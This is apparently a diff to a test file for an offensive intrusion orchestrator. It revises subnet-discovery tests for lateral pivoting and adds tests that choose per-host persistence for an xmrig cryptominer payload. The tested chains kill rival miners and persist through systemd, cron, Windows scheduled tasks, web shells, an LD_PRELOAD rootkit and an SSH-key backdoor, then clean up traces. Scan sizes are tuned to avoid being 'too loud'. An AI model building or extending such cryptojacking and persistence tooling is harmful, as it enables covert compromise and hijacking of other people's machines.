@@ -31,9 +31,11 @@ def test_adjacent_subnets_parses_ip_o_addr():
         "4: docker0    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0\n"
     )
     nets = _adjacent_subnets(out)
-    # loopback skipped, RFC1918 kept, /16 docker collapsed to /24 for pivoting.
-    # canonical network base (host IP zeroed), not the host address itself.
-    assert nets == ["10.0.0.0/24", "192.168.1.0/24", "172.17.0.0/24"]
+    # loopback skipped, RFC1918 kept. Finding #8: the actual CIDR is now
+    # read from the output instead of forcing /24. The /16 docker interface
+    # is capped at /20 (4096 hosts — large enough for a pivot, small enough
+    # to finish in a reasonable scan).
+    assert nets == ["10.0.0.0/24", "192.168.1.0/24", "172.17.0.0/20"]
 
 
 def test_adjacent_subnets_skips_loopback_and_linklocal():
@@ -44,9 +46,14 @@ def test_adjacent_subnets_skips_loopback_and_linklocal():
     assert _adjacent_subnets(out) == []
 
 
-def test_adjacent_subnets_tight_cidr_widened_to_24():
+def test_adjacent_subnets_preserves_actual_cidr():
+    """Finding #8: the actual CIDR from ip -o -4 addr is used, not forced /24.
+    A /30 stays a /30 (4 hosts); a /16 is capped at /20."""
     out = "2: eth0    inet 10.5.5.7/30 brd 10.5.5.7 scope global eth0\n"
-    assert _adjacent_subnets(out) == ["10.5.5.0/24"]
+    assert _adjacent_subnets(out) == ["10.5.5.4/30"]
+    # A /8 would be too loud — capped at /20.
+    out2 = "2: eth0    inet 10.0.0.5/8 brd 10.255.255.255 scope global eth0\n"
+    assert _adjacent_subnets(out2) == ["10.0.0.0/20"]
 
 
 class _MockChain(ChainOrchestrator):
@@ -378,6 +385,122 @@ def test_phase_persist_aborts_without_pool_for_miner(monkeypatch):
     assert orch.state.enqueued == []
     assert any(e["phase"] == "persist" and "ABORT" in e["msg"]
                for e in orch.state.log)
+
+
+# --------------------------------------------------------------------------- #
+# Phase 8: Per-foothold persistence selection
+# --------------------------------------------------------------------------- #
+
+
+class TestPersistenceProfile:
+    def _make_orch(self, **kw):
+        cfg = ChainConfig(payload_id="xmrig", pool="p", wallet="w", **kw)
+        return ChainOrchestrator(cfg)
+
+    def test_root_linux_profile(self):
+        orch = self._make_orch()
+        profile = orch._persistence_profile("10.0.0.1", 22, "root")
+        assert "linux" in profile
+        assert "root" in profile
+
+    def test_normal_linux_profile(self):
+        orch = self._make_orch()
+        profile = orch._persistence_profile("10.0.0.1", 22, "ubuntu")
+        assert "normal" in profile
+
+    def test_container_profile_from_loot(self):
+        orch = self._make_orch()
+        orch.state.loot = [{"ip": "10.0.0.1", "metadata": {"docker_socket_present": "true"}}]
+        profile = orch._persistence_profile("10.0.0.1", 22, "root")
+        assert "container" in profile
+
+    def test_container_profile_from_dockerenv(self):
+        orch = self._make_orch()
+        orch.state.loot = [{"ip": "10.0.0.1", "raw": ".dockerenv found"}]
+        profile = orch._persistence_profile("10.0.0.1", 22, "root")
+        assert "container" in profile
+
+    def test_web_profile_from_loot(self):
+        orch = self._make_orch()
+        orch.state.loot = [{"ip": "10.0.0.1", "services": "80/tcp open http"}]
+        profile = orch._persistence_profile("10.0.0.1", 22, "root")
+        assert "web" in profile
+
+    def test_windows_profile(self):
+        orch = self._make_orch()
+        orch.state.loot = [{"ip": "10.0.0.1", "raw": "cmd.exe found"}]
+        profile = orch._persistence_profile("10.0.0.1", 22, "admin")
+        assert profile == "windows"
+
+
+class TestEvasionChainForProfile:
+    def _make_orch(self, **kw):
+        cfg = ChainConfig(payload_id="xmrig", pool="p", wallet="w", **kw)
+        return ChainOrchestrator(cfg)
+
+    def test_root_linux_gets_systemd_cron_ldpreload(self):
+        orch = self._make_orch()
+        chain = orch._evasion_chain_for_profile("linux_root")
+        assert "kill_miners" in chain
+        assert "systemd_persist" in chain
+        assert "cron_persist" in chain
+        assert "ld_preload_rootkit" in chain
+        assert "cleanup" in chain
+        # cleanup is last
+        assert chain[-1] == "cleanup"
+
+    def test_container_skips_systemd(self):
+        orch = self._make_orch()
+        chain = orch._evasion_chain_for_profile("linux_container")
+        assert "systemd_persist" not in chain
+        assert "cron_persist" in chain  # cron is the fallback
+
+    def test_container_with_web_gets_webshell(self):
+        orch = self._make_orch()
+        chain = orch._evasion_chain_for_profile("linux_container_web")
+        assert "web_shell_persist" in chain
+
+    def test_normal_linux_gets_systemd_cron(self):
+        orch = self._make_orch()
+        chain = orch._evasion_chain_for_profile("linux_normal")
+        assert "systemd_persist" in chain
+        assert "cron_persist" in chain
+        assert "ld_preload_rootkit" not in chain  # needs root
+
+    def test_windows_gets_scheduled_task(self):
+        orch = self._make_orch()
+        chain = orch._evasion_chain_for_profile("windows")
+        assert "scheduled_task_persist" in chain
+        assert "systemd_persist" not in chain
+        assert "cron_persist" not in chain
+
+    def test_root_with_web_gets_webshell(self):
+        orch = self._make_orch()
+        chain = orch._evasion_chain_for_profile("linux_root_web")
+        assert "web_shell_persist" in chain
+        assert "ld_preload_rootkit" in chain
+
+    def test_backdoor_key_adds_sshkey(self):
+        orch = self._make_orch(backdoor_key="ssh-rsa AAAA...")
+        chain = orch._evasion_chain_for_profile("linux_root")
+        assert "sshkey_backdoor" in chain
+
+    def test_no_backdoor_key_skips_sshkey(self):
+        orch = self._make_orch()
+        chain = orch._evasion_chain_for_profile("linux_root")
+        assert "sshkey_backdoor" not in chain
+
+    def test_kill_miners_always_first(self):
+        orch = self._make_orch()
+        for profile in ["linux_root", "linux_normal", "linux_container", "windows"]:
+            chain = orch._evasion_chain_for_profile(profile)
+            assert chain[0] == "kill_miners"
+
+    def test_cleanup_always_last(self):
+        orch = self._make_orch()
+        for profile in ["linux_root", "linux_normal", "linux_container", "windows"]:
+            chain = orch._evasion_chain_for_profile(profile)
+            assert chain[-1] == "cleanup"
 
 
 def test_phase_pivot_accumulates_subnets(monkeypatch):
